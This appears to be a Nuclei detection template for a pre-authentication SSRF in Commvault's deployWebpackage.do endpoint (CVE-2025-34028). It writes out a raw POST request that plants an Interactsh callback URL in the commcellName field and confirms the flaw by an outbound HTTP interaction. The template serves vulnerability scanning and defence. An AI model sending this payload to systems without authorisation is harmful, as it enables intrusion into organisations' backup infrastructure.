id: commvault-ssrf-deploywebpackage-detect

info:
  name: Commvault deployWebpackage.do SSRF Detection
  author: nickaures
  severity: high
  description: |
    Detects SSRF in Commvault Innovation Release 11.38.0â€“11.38.19 via deployWebpackage.do endpoint using Interactsh.
  reference:
    - https://watchtowr.com/blog/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/
  tags: ssrf,commvault,preauth,cve,cve2025
  classification:
    cve-id: CVE-2025-34028

http:
  - raw:
      - |
        POST /commandcenter/deployWebpackage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        commcellName={{interactsh-url}}&servicePack=test&version=test

    payloads:
      interactsh-url:
        - "{{interactsh-url}}"

    attack: pitchfork

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
